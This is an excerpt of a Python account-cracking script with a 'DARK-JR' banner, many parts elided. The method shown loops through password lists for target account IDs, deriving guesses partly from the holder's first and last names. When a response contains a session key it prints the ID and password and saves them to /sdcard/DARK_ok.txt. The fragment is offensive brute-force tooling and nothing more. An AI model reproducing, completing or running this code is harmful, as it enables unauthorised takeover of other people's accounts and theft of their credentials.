...
d8888b.  .d8b.  d8888b. db   dD           d88b d8888b. 
88  `8D d8' `8b 88  `8D 88 ,8P'           `8P' 88  `8D 
88   88 88ooo88 88oobY' 88,8P              88  88oobY' 
88   88 88~~~88 88`8b   88`8b   C8888D     88  88`8b   
88  .8D 88   88 88 `88. 88 `88.        db. 88  88 `88. 
Y8888D' YP   YP 88   YD YP   YD        Y8888P  88   YD 
                                                 
{50*"-"}
    Tool Version :     1.3
    Thanks Alot  :     Md. Jahangir Alam
{50*"-"}'''
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[DARK-JR] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[DARK-JR-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/DARK_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
